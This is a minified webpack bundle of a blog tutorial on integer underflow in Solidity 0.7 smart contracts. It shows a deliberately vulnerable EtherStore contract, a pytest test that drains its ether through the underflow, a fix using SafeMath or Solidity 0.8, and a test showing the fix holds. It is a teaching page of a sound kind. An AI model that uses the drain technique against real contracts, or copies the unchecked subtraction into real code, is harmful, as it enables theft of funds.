"use strict";(self.webpackChunkbuildany_website=self.webpackChunkbuildany_website||[]).push([[580],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return p}});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},d=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},f=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),f=c(n),p=a,h=f["".concat(l,".").concat(p)]||f[p]||u[p]||o;return n?r.createElement(h,i(i({ref:t},d),{},{components:n})):r.createElement(h,i({ref:t},d))}));function p(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=f;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}f.displayName="MDXCreateElement"},35083:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return d},default:function(){return f}});var r=n(87462),a=n(63366),o=(n(67294),n(3905)),i=["components"],s={sidebar_position:3,tags:["underflow","solidity","attack"]},l="Underflow",c={unversionedId:"solidity-hacks/underflow",id:"solidity-hacks/underflow",title:"Underflow",description:"This exploit is reproducible only in Solidity version 7 and below. Since the release of the version 8, the overflow code causes VirtualMachineError by default.",source:"@site/docs/solidity-hacks/underflow.md",sourceDirName:"solidity-hacks",slug:"/solidity-hacks/underflow",permalink:"/docs/solidity-hacks/underflow",editUrl:"https://github.com/kkateq/blog/docs/solidity-hacks/underflow.md",tags:[{label:"underflow",permalink:"/docs/tags/underflow"},{label:"solidity",permalink:"/docs/tags/solidity"},{label:"attack",permalink:"/docs/tags/attack"}],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3,tags:["underflow","solidity","attack"]},sidebar:"tutorialSidebar",previous:{title:"Overflow",permalink:"/docs/solidity-hacks/overflow"},next:{title:"Self destruct",permalink:"/docs/solidity-hacks/self-destruct"}},d=[{value:"Description",id:"description",children:[],level:3},{value:"How to test",id:"how-to-test",children:[],level:3},{value:"How to fix",id:"how-to-fix",children:[],level:3},{value:"Demo",id:"demo",children:[],level:3}],u={toc:d};function f(e){var t=e.components,n=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"underflow"},"Underflow"),(0,o.kt)("div",{className:"admonition admonition-caution alert alert--warning"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 16 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"}))),"DEPRECATED")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"This exploit is reproducible only in Solidity ",(0,o.kt)("strong",{parentName:"p"},"version 7")," and below. Since the release of the version ",(0,o.kt)("strong",{parentName:"p"},"8"),", the overflow code causes ",(0,o.kt)("inlineCode",{parentName:"p"},"VirtualMachineError")," by default."))),(0,o.kt)("h3",{id:"description"},"Description"),(0,o.kt)("p",null,"An arithmetic underflow very similar to the ",(0,o.kt)("a",{parentName:"p",href:"/docs/solidity-hacks/overflow"},"overflow")," problem. However, here the exploit would attempt to convert zero into a positive integer and thus allow us to execute the logic of the contract we would not be allowed otherwise."),(0,o.kt)("p",null,"Consider the following smart contract:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/underflow/EtherStoreUnderflow.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/underflow/EtherStoreUnderflow.sol",title:"/contracts/underflow/EtherStoreUnderflow.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/underflow/EtherStoreUnderflow.sol"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\nimport "@openzeppelinV7/contracts/utils/ReentrancyGuard.sol";\n\ncontract EtherStoreUnderflow is ReentrancyGuard {\n    mapping(address => uint256) public balances;\n\n    ...\n\n    function withdraw() public nonReentrant {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent, ) = msg.sender.call{value: bal}("");\n\n        require(sent, "Transfer failed.");\n\n        balances[msg.sender] = 0;\n    }\n\n    function transfer(address _to, uint256 _value)\n        public\n        nonReentrant\n        returns (bool)\n    {\n        // highlight-next-line\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    ...\n')),(0,o.kt)("p",null,"To perform this attack, we assume that the contract's balance is not 0. Some users have deposited ETH. Then two new users come into the play. Let's say an attacker and his friend. Both have 0 balance on this contract. However, not for long. The line of the attacker's interest is 29. The underflow of the ",(0,o.kt)("inlineCode",{parentName:"p"},"uint256")," variable will result in a positive number if we perform a simple arithmetic operation with the ",(0,o.kt)("inlineCode",{parentName:"p"},"_value")," of the contract balance minus 1, for instance."),(0,o.kt)("h3",{id:"how-to-test"},"How to test"),(0,o.kt)("p",null,"Let's consider the following unit test executing the attack:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:"title=/tests/underflow/test_ether_store_underflow.py sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22",title:"/tests/underflow/test_ether_store_underflow.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22"},'\nimport pytest\nfrom brownie import exceptions\nfrom scripts.utils import (\n    get_attacker_account,\n    get_default_account,\n    get_user_account,\n)\nfrom scripts.underflow.deploy_and_attack import deploy_contract, deploy_fixed_contract\nfrom web3 import Web3\n\n\n\ndef test_ether_store_underflow_successful_attack():\n    store_contract = deploy_contract()\n\n    # 1.Deposit some funds to the contract\n    deposit_tx = store_contract.deposit(\n        {"from": get_default_account(), "value": Web3.toWei(30, "ether")}\n    )\n\n    deposit_tx.wait(1)\n\n    # 2. Prepare users to perform the attack, and fixate their balances before the execution\n    attacker = get_attacker_account()\n    attackers_friend = get_user_account()\n    attacker_balance = attacker.balance() / 10**18\n    attackers_friend_balance = attackers_friend.balance() / 10**18\n    store_balance = store_contract.balanceOf() / 10**18\n\n    print(f"Store balance: {store_balance} ETH")\n\n    # 3. Lets withdraw everything - 1, for example\n    WITHDRAW_AMOUNT = store_balance - 1\n\n    # 4. Call transfer function of the contract to shuffle the funds to the attacker\'s account\n    transfer_tx = store_contract.transfer(\n        attacker.address,\n        Web3.toWei(WITHDRAW_AMOUNT, "ether"),\n        {"from": attackers_friend},\n    )\n    transfer_tx.wait(1)\n\n    assert store_contract.user_balanceOf(attacker.address) == Web3.toWei(\n        WITHDRAW_AMOUNT, "ether"\n    )\n\n    # 5. Withdraw funds from the contract to the attacker account\n    withdraw_tx = store_contract.withdraw({"from": attacker})\n    withdraw_tx.wait(1)\n\n    assert store_contract.balanceOf() / 10**18 == 1\n    # highlight-next-line\n    assert attacker.balance() / 10**18 == attacker_balance + WITHDRAW_AMOUNT\n    assert attackers_friend.balance() / 10**18 == attackers_friend_balance\n\n    ...\n\n')),(0,o.kt)("p",null,"The test asserts the attackers balance on line 53, confirming a successful transfer of the ",(0,o.kt)("inlineCode",{parentName:"p"},"WITHDRAW_AMOUNT"),"."),(0,o.kt)("h3",{id:"how-to-fix"},"How to fix"),(0,o.kt)("p",null,"If you would use solidity prior v8, it's necessary to use safe math libraries to fix this problem. One of the examples is the ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol"},"SafeMath")," from OpenZeppelin. The best option is to upgrade Solidity to v8."),(0,o.kt)("h3",{id:"demo"},"Demo"),(0,o.kt)("p",null,"I ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/underflow/EtherStoreUnderflowFixed.sol"},"chose")," upgrading Solidity version to fix the problem. Additionally, this points again that using the latest available solidity version is the safest option to go."),(0,o.kt)("p",null,"Check out the unit test that now fails to exploit the contract:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:"title=/tests/underflow/test_ether_store_underflow.py sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22",title:"/tests/underflow/test_ether_store_underflow.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/underflow/test_ether_store_underflow.py#L22"},'\n   ...\n\ndef test_ether_store_underflow_fixed_failed_attack():\n    store_contract = deploy_fixed_contract()\n\n    # 1.Deposit some funds\n    deposit_tx = store_contract.deposit(\n        {"from": get_default_account(), "value": Web3.toWei(30, "ether")}\n    )\n\n    deposit_tx.wait(1)\n\n    attacker = get_attacker_account()\n    attackers_friend = get_user_account()\n    attacker_balance = attacker.balance() / 10**18\n    attackers_friend_balance = attackers_friend.balance() / 10**18\n    store_balance = store_contract.balanceOf() / 10**18\n    print(f"Store balance: {store_balance} ETH")\n\n    # Lets withdraw everything - 1, for example\n    WITHDRAW_AMOUNT = store_balance - 1\n\n    # 2. Call transfer function of the contract to shuffle the funds to the attacker\'s account\n    #  highlight-next-line\n    with pytest.raises(exceptions.VirtualMachineError):\n        transfer_tx = store_contract.transfer(\n            attacker.address,\n            Web3.toWei(WITHDRAW_AMOUNT, "ether"),\n            {"from": attackers_friend},\n        )\n        transfer_tx.wait(1)\n\n    assert store_contract.user_balanceOf(attacker.address) == 0\n    assert store_contract.balanceOf() / 10**18 == store_balance\n    assert attacker.balance() / 10**18 == attacker_balance\n    assert attackers_friend.balance() / 10**18 == attackers_friend_balance\n\n    ...\n\n')),(0,o.kt)("p",null,"So the test above shows that a transfer attempt would raise an exception which would be the expected behavior."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Thank you for reading and good luck with building secure blockchain!")))}f.isMDXComponent=!0}}]);